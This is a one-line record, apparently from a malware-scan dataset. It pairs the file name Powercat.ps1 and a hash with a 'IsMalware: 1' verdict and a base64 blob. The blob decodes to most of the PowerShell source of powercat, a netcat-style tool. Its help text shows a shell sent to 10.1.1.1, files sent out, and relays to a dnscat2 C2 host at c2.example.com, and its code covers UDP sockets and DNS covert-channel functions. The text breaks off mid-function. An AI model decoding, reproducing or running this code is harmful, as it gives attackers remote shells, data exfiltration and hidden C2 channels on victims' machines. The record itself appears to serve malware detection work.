Powercat.ps1,e54b0c671427e23192839dbb56f67c7b,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gcG93ZXJjYXQKewogIHBhcmFtKAogICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjPSIiLAogICAgW2FsaWFzKCJMaXN0ZW4iKV1bc3dpdGNoXSRsPSRGYWxzZSwKICAgIFthbGlhcygiUG9ydCIpXVtQYXJhbWV0ZXIoUG9zaXRpb249LTEpXVtzdHJpbmddJHA9IiIsCiAgICBbYWxpYXMoIkV4ZWN1dGUiKV1bc3RyaW5nXSRlPSIiLAogICAgW2FsaWFzKCJFeGVjdXRlUG93ZXJzaGVsbCIpXVtzd2l0Y2hdJGVwPSRGYWxzZSwKICAgIFthbGlhcygiUmVsYXkiKV1bc3RyaW5nXSRyPSIiLAogICAgW2FsaWFzKCJVRFAiKV1bc3dpdGNoXSR1PSRGYWxzZSwKICAgIFthbGlhcygiZG5zY2F0MiIpXVtzdHJpbmddJGRucz0iIiwKICAgIFthbGlhcygiRE5TRmFpbHVyZVRocmVzaG9sZCIpXVtpbnQzMl0kZG5zZnQ9MTAsCiAgICBbYWxpYXMoIlRpbWVvdXQiKV1baW50MzJdJHQ9NjAsCiAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV1bYWxpYXMoIklucHV0IildJGk9JG51bGwsCiAgICBbVmFsaWRhdGVTZXQoJ0hvc3QnLCAnQnl0ZXMnLCAnU3RyaW5nJyldW2FsaWFzKCJPdXRwdXRUeXBlIildW3N0cmluZ10kbz0iSG9zdCIsCiAgICBbYWxpYXMoIk91dHB1dEZpbGUiKV1bc3RyaW5nXSRvZj0iIiwKICAgIFthbGlhcygiRGlzY29ubmVjdCIpXVtzd2l0Y2hdJGQ9JEZhbHNlLAogICAgW2FsaWFzKCJSZXBlYXRlciIpXVtzd2l0Y2hdJHJlcD0kRmFsc2UsCiAgICBbYWxpYXMoIkdlbmVyYXRlUGF5bG9hZCIpXVtzd2l0Y2hdJGc9JEZhbHNlLAogICAgW2FsaWFzKCJHZW5lcmF0ZUVuY29kZWQiKV1bc3dpdGNoXSRnZT0kRmFsc2UsCiAgICBbYWxpYXMoIkhlbHAiKV1bc3dpdGNoXSRoPSRGYWxzZQogICkKICAKICAjIyMjIyMjIyMjIyMjIyMgSEVMUCAjIyMjIyMjIyMjIyMjIyMKICAkSGVscCA9ICIKcG93ZXJjYXQgLSBOZXRjYXQsIFRoZSBQb3dlcnNoZWxsIFZlcnNpb24KR2l0aHViIFJlcG9zaXRvcnk6IGh0dHBzOi8vZ2l0aHViLmNvbS9iZXNpbW9yaGluby9wb3dlcmNhdAoKVGhpcyBzY3JpcHQgYXR0ZW1wdHMgdG8gaW1wbGVtZW50IHRoZSBmZWF0dXJlcyBvZiBuZXRjYXQgaW4gYSBwb3dlcnNoZWxsCnNjcmlwdC4gSXQgYWxzbyBjb250YWlucyBleHRyYSBmZWF0dXJlcyBzdWNoIGFzIGJ1aWx0LWluIHJlbGF5cywgZXhlY3V0ZQpwb3dlcnNoZWxsLCBhbmQgYSBkbnNjYXQyIGNsaWVudC4KClVzYWdlOiBwb3dlcmNhdCBbLWMgb3IgLWxdIFstcCBwb3J0XSBbb3B0aW9uc10KCiAgLWMgIDxpcD4gICAgICAgIENsaWVudCBNb2RlLiBQcm92aWRlIHRoZSBJUCBvZiB0aGUgc3lzdGVtIHlvdSB3aXNoIHRvIGNvbm5lY3QgdG8uCiAgICAgICAgICAgICAgICAgIElmIHlvdSBhcmUgdXNpbmcgLWRucywgc3BlY2lmeSB0aGUgRE5TIFNlcnZlciB0byBzZW5kIHF1ZXJpZXMgdG8uCiAgICAgICAgICAgIAogIC1sICAgICAgICAgICAgICBMaXN0ZW4gTW9kZS4gU3RhcnQgYSBsaXN0ZW5lciBvbiB0aGUgcG9ydCBzcGVjaWZpZWQgYnkgLXAuCiAgCiAgLXAgIDxwb3J0PiAgICAgIFBvcnQuIFRoZSBwb3J0IHRvIGNvbm5lY3QgdG8sIG9yIHRoZSBwb3J0IHRvIGxpc3RlbiBvbi4KICAKICAtZSAgPHByb2M+ICAgICAgRXhlY3V0ZS4gU3BlY2lmeSB0aGUgbmFtZSBvZiB0aGUgcHJvY2VzcyB0byBzdGFydC4KICAKICAtZXAgICAgICAgICAgICAgRXhlY3V0ZSBQb3dlcnNoZWxsLiBTdGFydCBhIHBzZXVkbyBwb3dlcnNoZWxsIHNlc3Npb24uIFlvdSBjYW4KICAgICAgICAgICAgICAgICAgZGVjbGFyZSB2YXJpYWJsZXMgYW5kIGV4ZWN1dGUgY29tbWFuZHMsIGJ1dCBpZiB5b3UgdHJ5IHRvIGVudGVyCiAgICAgICAgICAgICAgICAgIGFub3RoZXIgc2hlbGwgKG5zbG9va3VwLCBuZXRzaCwgY21kLCBldGMuKSB0aGUgc2hlbGwgd2lsbCBoYW5nLgogICAgICAgICAgICAKICAtciAgPHN0cj4gICAgICAgUmVsYXkuIFVzZWQgZm9yIHJlbGF5aW5nIG5ldHdvcmsgdHJhZmZpYyBiZXR3ZWVuIHR3byBub2Rlcy4KICAgICAgICAgICAgICAgICAgQ2xpZW50IFJlbGF5IEZvcm1hdDogICAtciA8cHJvdG9jb2w+OjxpcCBhZGRyPjo8cG9ydD4KICAgICAgICAgICAgICAgICAgTGlzdGVuZXIgUmVsYXkgRm9ybWF0OiAtciA8cHJvdG9jb2w+Ojxwb3J0PgogICAgICAgICAgICAgICAgICBETlNDYXQyIFJlbGF5IEZvcm1hdDogIC1yIGRuczo8ZG5zIHNlcnZlcj46PGRucyBwb3J0Pjo8ZG9tYWluPgogICAgICAgICAgICAKICAtdSAgICAgICAgICAgICAgVURQIE1vZGUuIFNlbmQgdHJhZmZpYyBvdmVyIFVEUC4gQmVjYXVzZSBpdCdzIFVEUCwgdGhlIGNsaWVudAogICAgICAgICAgICAgICAgICBtdXN0IHNlbmQgZGF0YSBiZWZvcmUgdGhlIHNlcnZlciBjYW4gcmVzcG9uZC4KICAgICAgICAgICAgCiAgLWRucyAgPGRvbWFpbj4gIEROUyBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciB0aGUgZG5zY2F0MiBkbnMgY292ZXJ0IGNoYW5uZWwuCiAgICAgICAgICAgICAgICAgIFNwZWNpZnkgdGhlIGRucyBzZXJ2ZXIgdG8gLWMsIHRoZSBkbnMgcG9ydCB0byAtcCwgYW5kIHNwZWNpZnkgdGhlIAogICAgICAgICAgICAgICAgICBkb21haW4gdG8gdGhpcyBvcHRpb24sIC1kbnMuIFRoaXMgaXMgb25seSBhIGNsaWVudC4KICAgICAgICAgICAgICAgICAgR2V0IHRoZSBzZXJ2ZXIgaGVyZTogaHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0MgogICAgICAgICAgICAKICAtZG5zZnQgPGludD4gICAgRE5TIEZhaWx1cmUgVGhyZXNob2xkLiBUaGlzIGlzIGhvdyBtYW55IGJhZCBwYWNrZXRzIHRoZSBjbGllbnQgY2FuCiAgICAgICAgICAgICAgICAgIHJlY2lldmUgYmVmb3JlIGV4aXRpbmcuIFNldCB0byB6ZXJvIHdoZW4gcmVjZWl2aW5nIGZpbGVzLCBhbmQgc2V0IGhpZ2gKICAgICAgICAgICAgICAgICAgZm9yIG1vcmUgc3RhYmlsaXR5IG92ZXIgdGhlIGludGVybmV0LgogICAgICAgICAgICAKICAtdCAgPGludD4gICAgICAgVGltZW91dC4gVGhlIG51bWJlciBvZiBzZWNvbmRzIHRvIHdhaXQgYmVmb3JlIGdpdmluZyB1cCBvbiBsaXN0ZW5pbmcgb3IKICAgICAgICAgICAgICAgICAgY29ubmVjdGluZy4gRGVmYXVsdDogNjAKICAgICAgICAgICAgCiAgLWkgIDxpbnB1dD4gICAgIElucHV0LiBQcm92aWRlIGRhdGEgdG8gYmUgc2VudCBkb3duIHRoZSBwaXBlIGFzIHNvb24gYXMgYSBjb25uZWN0aW9uIGlzCiAgICAgICAgICAgICAgICAgIGVzdGFibGlzaGVkLiBVc2VkIGZvciBtb3ZpbmcgZmlsZXMuIFlvdSBjYW4gcHJvdmlkZSB0aGUgcGF0aCB0byBhIGZpbGUsCiAgICAgICAgICAgICAgICAgIGEgYnl0ZSBhcnJheSBvYmplY3QsIG9yIGEgc3RyaW5nLiBZb3UgY2FuIGFsc28gcGlwZSBhbnkgb2YgdGhvc2UgaW50bwogICAgICAgICAgICAgICAgICBwb3dlcmNhdCwgbGlrZSAnYWFhYWFhJyB8IHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDgwCiAgICAgICAgICAgIAogIC1vICA8dHlwZT4gICAgICBPdXRwdXQuIFNwZWNpZnkgaG93IHBvd2VyY2F0IHNob3VsZCByZXR1cm4gaW5mb3JtYXRpb24gdG8gdGhlIGNvbnNvbGUuCiAgICAgICAgICAgICAgICAgIFZhbGlkIG9wdGlvbnMgYXJlICdCeXRlcycsICdTdHJpbmcnLCBvciAnSG9zdCcuIERlZmF1bHQgaXMgJ0hvc3QnLgogICAgICAgICAgICAKICAtb2YgPHBhdGg+ICAgICAgT3V0cHV0IEZpbGUuICBTcGVjaWZ5IHRoZSBwYXRoIHRvIGEgZmlsZSB0byB3cml0ZSBvdXRwdXQgdG8uCiAgICAgICAgICAgIAogIC1kICAgICAgICAgICAgICBEaXNjb25uZWN0LiBwb3dlcmNhdCB3aWxsIGRpc2Nvbm5lY3QgYWZ0ZXIgdGhlIGNvbm5lY3Rpb24gaXMgZXN0YWJsaXNoZWQKICAgICAgICAgICAgICAgICAgYW5kIHRoZSBpbnB1dCBmcm9tIC1pIGlzIHNlbnQuIFVzZWQgZm9yIHNjYW5uaW5nLgogICAgICAgICAgICAKICAtcmVwICAgICAgICAgICAgUmVwZWF0ZXIuIHBvd2VyY2F0IHdpbGwgY29udGludWFsbHkgcmVzdGFydCBhZnRlciBpdCBpcyBkaXNjb25uZWN0ZWQuCiAgICAgICAgICAgICAgICAgIFVzZWQgZm9yIHNldHRpbmcgdXAgYSBwZXJzaXN0ZW50IHNlcnZlci4KICAgICAgICAgICAgICAgICAgCiAgLWcgICAgICAgICAgICAgIEdlbmVyYXRlIFBheWxvYWQuICBSZXR1cm5zIGEgc2NyaXB0IGFzIGEgc3RyaW5nIHdoaWNoIHdpbGwgZXhlY3V0ZSB0aGUKICAgICAgICAgICAgICAgICAgcG93ZXJjYXQgd2l0aCB0aGUgb3B0aW9ucyB5b3UgaGF2ZSBzcGVjaWZpZWQuIC1pLCAtZCwgYW5kIC1yZXAgd2lsbCBub3QKICAgICAgICAgICAgICAgICAgYmUgaW5jb3Jwb3JhdGVkLgogICAgICAgICAgICAgICAgICAKICAtZ2UgICAgICAgICAgICAgR2VuZXJhdGUgRW5jb2RlZCBQYXlsb2FkLiBEb2VzIHRoZSBzYW1lIGFzIC1nLCBidXQgcmV0dXJucyBhIHN0cmluZyB3aGljaAogICAgICAgICAgICAgICAgICBjYW4gYmUgZXhlY3V0ZWQgaW4gdGhpcyB3YXk6IHBvd2Vyc2hlbGwgLUUgPGVuY29kZWQgc3RyaW5nPgoKICAtaCAgICAgICAgICAgICAgUHJpbnQgdGhpcyBoZWxwIG1lc3NhZ2UuCgpFeGFtcGxlczoKCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcHJpbnQgdGhlIG91dHB1dCB0byB0aGUgY29uc29sZS4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMAogIAogIENvbm5lY3QgdG8gMTAuMS4xLjEgcG9ydCA0NDMsIHNlbmQgYSBzaGVsbCwgYW5kIGVuYWJsZSB2ZXJib3NpdHkuCiAgICAgIHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDQ0MyAtZSBjbWQgLXYKICAKICBDb25uZWN0IHRvIHRoZSBkbnNjYXQyIHNlcnZlciBvbiBjMi5leGFtcGxlLmNvbSwgYW5kIHNlbmQgZG5zIHF1ZXJpZXMKICB0byB0aGUgZG5zIHNlcnZlciBvbiAxMC4xLjEuMSBwb3J0IDUzLgogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA1MyAtZG5zIGMyLmV4YW1wbGUuY29tCiAgCiAgU2VuZCBhIGZpbGUgdG8gMTAuMS4xLjE1IHBvcnQgODAwMC4KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjE1IC1wIDgwMDAgLWkgQzpcaW5wdXRmaWxlCiAgCiAgV3JpdGUgdGhlIGRhdGEgc2VudCB0byB0aGUgbG9jYWwgbGlzdGVuZXIgb24gcG9ydCA0NDQ0IHRvIEM6XG91dGZpbGUKICAgICAgcG93ZXJjYXQgLWwgLXAgNDQ0NCAtb2YgQzpcb3V0ZmlsZQogIAogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHJlcGVhdGVkbHkgc2VydmVyIGEgcG93ZXJzaGVsbCBzaGVsbC4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtZXAgLXJlcAogIAogIFJlbGF5IHRyYWZmaWMgY29taW5nIGluIG9uIHBvcnQgODAwMCBvdmVyIHRjcCB0byBwb3J0IDkwMDAgb24gMTAuMS4xLjEgb3ZlciB0Y3AuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgdGNwOjEwLjEuMS4xOjkwMDAKICAgICAgCiAgUmVsYXkgdHJhZmZpYyBjb21pbmcgaW4gb24gcG9ydCA4MDAwIG92ZXIgdGNwIHRvIHRoZSBkbnNjYXQyIHNlcnZlciBvbiBjMi5leGFtcGxlLmNvbSwKICBzZW5kaW5nIHF1ZXJpZXMgdG8gMTAuMS4xLjEgcG9ydCA1My4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtciBkbnM6MTAuMS4xLjE6NTM6YzIuZXhhbXBsZS5jb20KIgogIGlmKCRoKXtyZXR1cm4gJEhlbHB9CiAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjCiAgJGdsb2JhbDpWZXJib3NlID0gJFZlcmJvc2UKICBpZigkb2YgLW5lICcnKXskbyA9ICdCeXRlcyd9CiAgaWYoJGRucyAtZXEgIiIpCiAgewogICAgaWYoKCgkYyAtZXEgIiIpIC1hbmQgKCEkbCkpIC1vciAoKCRjIC1uZSAiIikgLWFuZCAkbCkpe3JldHVybiAiWW91IG11c3Qgc2VsZWN0IGVpdGhlciBjbGllbnQgbW9kZSAoLWMpIG9yIGxpc3RlbiBtb2RlICgtbCkuIn0KICAgIGlmKCRwIC1lcSAiIil7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9CiAgfQogIGlmKCgoKCRyIC1uZSAiIikgLWFuZCAoJGUgLW5lICIiKSkgLW9yICgoJGUgLW5lICIiKSAtYW5kICgkZXApKSkgLW9yICAoKCRyIC1uZSAiIikgLWFuZCAoJGVwKSkpe3JldHVybiAiWW91IGNhbiBvbmx5IHBpY2sgb25lIG9mIHRoZXNlOiAtZSwgLWVwLCAtciJ9CiAgaWYoKCRpIC1uZSAkbnVsbCkgLWFuZCAoKCRyIC1uZSAiIikgLW9yICgkZSAtbmUgIiIpKSl7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9CiAgaWYoJGwpCiAgewogICAgJEZhaWx1cmUgPSAkRmFsc2UKICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkcCl7V3JpdGUtT3V0cHV0ICgiVGhlIHNlbGVjdGVkIHBvcnQgIiArICRwICsgIiBpcyBhbHJlYWR5IGluIHVzZS4iKSA7ICRGYWlsdXJlPSRUcnVlfX0KICAgIGlmKCRGYWlsdXJlKXticmVha30KICB9CiAgaWYoJHIgLW5lICIiKQogIHsKICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpCiAgICB7CiAgICAgICRGYWlsdXJlID0gJEZhbHNlCiAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKXtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHIuc3BsaXQoIjoiKVsxXSArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19CiAgICAgIGlmKCRGYWlsdXJlKXticmVha30KICAgIH0KICB9CiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfVURQCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICAkYywkbCwkcCwkdCA9ICRGdW5jU2V0dXBWYXJzCiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgaWYoJGwpCiAgICB7CiAgICAgICRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgICAkRW5kUG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAoW1N5c3RlbS5OZXQuSVBBZGRyZXNzXTo6QW55KSwgJHAKICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudCAkcAogICAgICAkUGFja2V0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLklQUGFja2V0SW5mb3JtYXRpb24KICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIikKICAgICAgJENvbm5lY3RIYW5kbGUgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVNZXNzYWdlRnJvbSgkU29ja2V0RGVzdGluYXRpb25CdWZmZXIsMCw2NTUzNixbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSxbcmVmXSRFbmRQb2ludCwkbnVsbCwkbnVsbCkKICAgICAgJFN0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICB3aGlsZSgkVHJ1ZSkKICAgICAgewogICAgICAgIGlmKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkKICAgICAgICB7CiAgICAgICAgICBpZihAKDE3LDI3KSAtY29udGFpbnMgKCRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIk5vRWNobyxJbmNsdWRlS2V5RG93biIpLlZpcnR1YWxLZXlDb2RlKSkKICAgICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBVRFAgU2V0dXAuLi4iCiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICBicmVhawogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkKICAgICAgICB7CiAgICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhawogICAgICAgIH0KICAgICAgICBpZigkQ29ubmVjdEhhbmRsZS5Jc0NvbXBsZXRlZCkKICAgICAgICB7CiAgICAgICAgICAkU29ja2V0Qnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZU1lc3NhZ2VGcm9tKCRDb25uZWN0SGFuZGxlLFtyZWZdKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRFbmRQb2ludCxbcmVmXSRQYWNrZXRJbmZvKQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJEVuZFBvaW50LlBvcnQgKyAiKSIpCiAgICAgICAgICBpZigkU29ja2V0Qnl0ZXNSZWFkIC1ndCAwKXticmVha30KICAgICAgICAgIGVsc2V7YnJlYWt9CiAgICAgICAgfQogICAgICB9CiAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICRGdW5jVmFyc1siSW5pdGlhbENvbm5lY3Rpb25CeXRlcyJdID0gJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyWzAuLihbaW50XSRTb2NrZXRCeXRlc1JlYWQtMSldCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgIGlmKCEkYy5Db250YWlucygiLiIpKQogICAgICB7CiAgICAgICAgJElQTGlzdCA9IEAoKQogICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAleyRJUExpc3QgKz0gJF8uSVBBZGRyZXNzVG9TdHJpbmd9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAoIk5hbWUgIiArICRjICsgIiByZXNvbHZlZCB0byBhZGRyZXNzICIgKyAkSVBMaXN0WzBdKQogICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkSVBMaXN0WzBdKSksICRwCiAgICAgIH0KICAgICAgZWxzZQogICAgICB7CiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRjKSksICRwCiAgICAgIH0KICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudAogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNvbm5lY3QoJGMsJHApCiAgICAgIFdyaXRlLVZlcmJvc2UgKCJTZW5kaW5nIFVEUCB0cmFmZmljIHRvICIgKyAkYyArICIgcG9ydCAiICsgJHAgKyAiLi4uIikKICAgICAgV3JpdGUtVmVyYm9zZSAoIlVEUDogTWFrZSBzdXJlIHRvIHNlbmQgc29tZSBkYXRhIHNvIHRoZSBzZXJ2ZXIgY2FuIG5vdGljZSB5b3UhIikKICAgIH0KICAgICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdID0gNjU1MzYKICAgICRGdW5jVmFyc1siRW5kUG9pbnQiXSA9ICRFbmRQb2ludAogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdCiAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLDAsJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwkbnVsbCwkbnVsbCkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfVURQCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJERhdGEgPSAkbnVsbAogICAgaWYoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdHJlYW1CeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5FbmRSZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSkKICAgICAgaWYoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9CiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdHJlYW1CeXRlc1JlYWQtMSldCiAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuQmVnaW5SZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sMCwkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwoW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRGbGFnc106Ok5vbmUpLFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdLCRudWxsLCRudWxsKQogICAgfQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBXcml0ZURhdGFfVURQCiAgewogICAgcGFyYW0oJERhdGEsJEZ1bmNWYXJzKQogICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuU2VuZFRvKCREYXRhLCRGdW5jVmFyc1siRW5kUG9pbnQiXSkgfCBPdXQtTnVsbAogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9VRFAKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICB9CiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICBmdW5jdGlvbiBDb252ZXJ0VG8tSGV4QXJyYXkKICAgIHsKICAgICAgcGFyYW0oJFN0cmluZykKICAgICAgJEhleCA9IEAoKQogICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmKCRfLkxlbmd0aCAtZXEgMSl7IjAiICsgW3N0cmluZ10kX30gZWxzZXtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQogICAgICByZXR1cm4gJEhleAogICAgfQogICAgCiAgICBmdW5jdGlvbiBTZW5kUGFja2V0CiAgICB7CiAgICAgIHBhcmFtKCRQYWNrZXQsJEROU1NlcnZlciwkRE5TUG9ydCkKICAgICAgJENvbW1hbmQgPSAoInNldCB0eXBlPVRYVGBuc2VydmVyICRETlNTZXJ2ZXJgbnNldCBwb3J0PSRETlNQb3J0YG5zZXQgZG9tYWluPS5jb21gbnNldCByZXRyeT0xYG4iICsgJFBhY2tldCArICJgbmV4aXQiKQogICAgICAkcmVzdWx0ID0gKCRDb21tYW5kIHwgbnNsb29rdXAgMj4mMSB8IE91dC1TdHJpbmcpCiAgICAgIGlmKCRyZXN1bHQuQ29udGFpbnMoJyInKSl7cmV0dXJuIChbcmVnZXhdOjpNYXRjaCgkcmVzdWx0LnJlcGxhY2UoImJpbz0iLCIiKSwnKD88PSIpW14iXSooPz0iKScpLlZhbHVlKX0KICAgICAgZWxzZXtyZXR1cm4gMX0KICAgIH0KICAgIAogICAgZnVuY3Rpb24gQ3JlYXRlX1NZTgogICAgewogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJFRhZywkRG9tYWluKQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMCIgKyAkU2Vzc2lvbklkICsgJFNlcU51bSArICIwMDAwIiArICREb21haW4pCiAgICB9